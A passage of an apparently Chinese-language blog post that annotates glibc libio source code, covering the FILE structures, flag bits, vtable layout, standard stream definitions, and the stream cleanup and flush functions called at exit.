_fileno;<span class="comment">/*文件描述符*/</span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//补充说明</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* A streammarker remembers a position in a buffer. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">next</span>;</span></span><br><span class="line">  FILE *_sbuf;</span><br><span class="line">  <span class="comment">/* If _pos &gt;= 0</span></span><br><span class="line"><span class="comment"> it points to _buf-&gt;Gbase()+_pos. FIXME comment */</span></span><br><span class="line">  <span class="comment">/* if _pos &lt; 0, it points to _buf-&gt;eBptr()+_pos. FIXME comment */</span></span><br><span class="line">  <span class="type">int</span> _pos;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a><code>flag</code></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Magic number and bits for the _flags field.  The magic number is</span></span><br><span class="line"><span class="comment">   mostly vestigial, but preserved for compatibility.  It occupies the</span></span><br><span class="line"><span class="comment">   high 16 bits of _flags; the low 16 bits are actual flag bits.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="comment">/* Magic number 验证file结构体的有效性*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don&#x27;t deallocate buffer on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS          0x0004 <span class="comment">/* Reading not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES         0x0008 <span class="comment">/* Writing not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN          0x0010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN          0x0020</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="comment">/* Don&#x27;t call close(_fileno) on close.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED            0x0080 <span class="comment">/* In the list of all open files.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP         0x0100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF          0x0200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="comment">/* Put and get pointer move in unison.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING      0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF        0x2000</span></span><br><span class="line">                           <span class="comment">/* 0x4000  No longer used, reserved for compat.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK         0x8000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits for the _flags2 field.  特殊扩展*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_MMAP 1 <span class="comment">/*如：mmap函数*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NOTCANCEL 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_USER_WBUF 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NOCLOSE 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_CLOEXEC 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_NEED_LOCK 128</span></span><br></pre></td></tr></table></figure>



<h2 id="struct-IO-FILE-plus"><a href="#struct-IO-FILE-plus" class="headerlink" title="struct _IO_FILE_plus"></a><code>struct _IO_FILE_plus</code></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a><code>_IO_jump_t</code></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*_IO_finish_t等变量都为函数指针*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="一些重要结构体实例的定义"><a href="#一些重要结构体实例的定义" class="headerlink" title="一些重要结构体实例的定义"></a>一些重要结构体实例的定义</h1><blockquote>
<p>一般放在.c文件，在头文件中写好extern声明，即可调用不同.c文件中的函数，文件中定义比较散乱，此处定义跨越几个.c文件</p>
</blockquote>
<h2 id="IO-2-1-stdin-IO-2-1-stdout-and-IO-2-1-stderr"><a href="#IO-2-1-stdin-IO-2-1-stdout-and-IO-2-1-stderr" class="headerlink" title="IO_2_1_stdin, IO_2_1_stdout,and IO_2_1_stderr"></a><em>IO_2_1_stdin</em>, <em>IO_2_1_stdout</em>,and <em>IO_2_1_stderr</em></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> FILEBUF_LITERAL(CHAIN, FLAGS, FD, WDP) \</span></span><br><span class="line"><span class="meta">       &#123; _IO_MAGIC+_IO_LINKED+_IO_IS_FILEBUF+FLAGS, \</span></span><br><span class="line"><span class="meta">	 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, (FILE *) CHAIN, FD, \</span></span><br><span class="line"><span class="meta">	 0, _IO_pos_BAD, 0, 0, &#123; 0 &#125;, 0, _IO_pos_BAD, \</span></span><br><span class="line"><span class="meta">	 NULL, WDP, 0 &#125;</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \</span></span><br><span class="line"><span class="meta">  static struct _IO_wide_data _IO_wide_data_##FD \</span></span><br><span class="line"><span class="meta">    = &#123; ._wide_vtable = &amp;_IO_wfile_jumps &#125;; \</span></span><br><span class="line"><span class="meta">  struct _IO_FILE_plus NAME \</span></span><br><span class="line"><span class="meta">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, &amp;_IO_wide_data_##FD), \</span></span><br><span class="line"><span class="meta">       &amp;_IO_file_jumps&#125;;</span></span><br><span class="line"></span><br><span class="line">DEF_STDFILE(_IO_2_1_stdin_, <span class="number">0</span>, <span class="number">0</span>, _IO_NO_WRITES);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stdout_, <span class="number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stderr_, <span class="number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libioP.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> stdin</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> stdout</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> stderr</span></span><br><span class="line">FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;</span><br><span class="line">FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;</span><br><span class="line">FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="IO-file-jumps（存在许多虚表，这里以标准输入输出的filejump为例）"><a href="#IO-file-jumps（存在许多虚表，这里以标准输入输出的filejump为例）" class="headerlink" title="_IO_file_jumps（存在许多虚表，这里以标准输入输出的filejump为例）"></a>_IO_file_jumps（存在许多虚表，这里以标准输入输出的filejump为例）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="IO-list-all"><a href="#IO-list-all" class="headerlink" title="_IO_list_all"></a>_IO_list_all</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;</span><br></pre></td></tr></table></figure>

<h2 id="虚表中各个函数的实现"><a href="#虚表中各个函数的实现" class="headerlink" title="虚表中各个函数的实现"></a>虚表中各个函数的实现</h2><blockquote>
<p>这是其他操作的基础，无论是库的读写接口，还是二次封装的printf之类的函数。</p>
</blockquote>
<p>………………………</p>
<h1 id="一些重要库内辅助函数的实现主要涉及（genops-c）"><a href="#一些重要库内辅助函数的实现主要涉及（genops-c）" class="headerlink" title="一些重要库内辅助函数的实现主要涉及（genops.c）"></a>一些重要库内辅助函数的实现主要涉及（genops.c）</h1><blockquote>
<p>本人比较菜，多线程锁机制基本没怎么考虑。</p>
<p>其中有的函数是对虚表函数的封装</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* _IO_list_all相关，将fp链接进入或链接出去_IO_list_all*/</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp);</span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp);</span><br></pre></td></tr></table></figure>

<h2 id="IO-cleanup-void"><a href="#IO-cleanup-void" class="headerlink" title="_IO_cleanup (void)"></a>_IO_cleanup (void)</h2><h3 id="函数主体-genops-c"><a href="#函数主体-genops-c" class="headerlink" title="函数主体(genops.c)"></a>函数主体(genops.c)</h3><blockquote>
<p>genops这个文件比较抽象，既包括了对外可以直接用的函数，也就是exit等函数会调用的函数，也包括了一些跳表函数实现起来的共同可以使用的函数。</p>
<p>exit函数在结束时会调用此函数，进行缓冲区的刷新和释放。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*清空缓冲区操作，首先会关闭所有的c++的stream流缓冲区，接着执行 _IO_unbuffer_all ();*/</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don&#x27;t have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they&#x27;re supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 下面的处理有点复杂。通常，我们希望使流处于无缓冲状态，以确保随后所有的输出都能被看到。如果我们不关心内存泄漏的问题，那么实际上释放缓冲区并没有太大意义，因为程序终止后缓冲区会自动释放。如果我们确实关心内存泄漏问题，那么就必须释放这些缓冲区。是否释放缓冲区由位于 `libc_freeres` 部分的函数决定。这些函数与 `_IO_cleanup` 一样，都是作为 `atexit` 例程的一部分被调用。问题是我们不知道 `freeres` 代码和 `_IO_cleanup` 哪个会先被调用。如果 `freeres` 代码先被调用，我们将 `DEALLOC_BUFFER` 变量设置为 `true`，然后 `_IO_unbuffer_all` 函数会处理剩下的工作。如果 `_IO_unbuffer_all` 先被调用，我们会将流添加到一个列表中，以便 `freeres` 函数稍后可以遍历该列表。*/</span></span><br><span class="line"><span class="comment">/*legacy为兼容老版本所需*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/*注意for循环，一开始没看见想了半天哈哈哈*/</span></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> legacy = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_vtable_offset (fp) != <span class="number">0</span>))</span><br><span class="line">	legacy = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">	  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">	  &amp;&amp; (legacy || fp-&gt;_mode != <span class="number">0</span>))</span><br><span class="line">	&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">	  <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">	  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">	    <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">else</span></span><br><span class="line">	      <span class="comment">/* Give the other thread time to finish up its use of the</span></span><br><span class="line"><span class="comment">		 stream.  */</span></span><br><span class="line">	      __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (! legacy &amp;&amp; ! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">	    &#123;</span><br><span class="line">	      fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">	      fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">	      freeres_list = fp;</span><br><span class="line">	      fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (! legacy &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">	    _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">	  <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">	    _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make sure that never again the wide char functions can be</span></span><br><span class="line"><span class="comment">	 used.  */</span></span><br><span class="line">      <span class="keyword">if</span> (! legacy)</span><br><span class="line">	fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="比较重要的宏（libioP-h）"><a href="#比较重要的宏（libioP-h）" class="headerlink" title="比较重要的宏（libioP.h）"></a>比较重要的宏（libioP.h）</h3><blockquote>
<p>以上述函数所用举例</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SETBUF(FP, BUFFER, LENGTH) JUMP2 (__setbuf, FP, BUFFER, LENGTH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line"><span class="comment">/*以下为了得到虚表指针*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">				       + offsetof(TYPE, MEMBER)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE)&#123;&#125;).MEMBER)</span></span><br><span class="line"><span class="comment">/* Offset of member MEMBER in a struct of type TYPE. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offsetof(TYPE, MEMBER) __builtin_offsetof (TYPE, MEMBER)</span></span><br></pre></td></tr></table></figure>

<h3 id="最终跳表函数的实现（fileops-c）"><a href="#最终跳表函数的实现（fileops-c）" class="headerlink" title="最终跳表函数的实现（fileops.c）"></a>最终跳表函数的实现（fileops.c）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_default_setbuf (fp, p, len) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">FILE *</span><br><span class="line">_IO_default_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">	fp-&gt;_flags |= _IO_UNBUFFERED;</span><br><span class="line">	_IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">	fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;</span><br><span class="line">	_IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="IO-flush-all-lockp-int-do-lock"><a href="#IO-flush-all-lockp-int-do-lock" class="headerlink" title="_IO_flush_all_lockp (int do_lock)"></a>_IO_flush_all_lockp (int do_lock)</h2><blockquote>
<p>刷新文件流</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

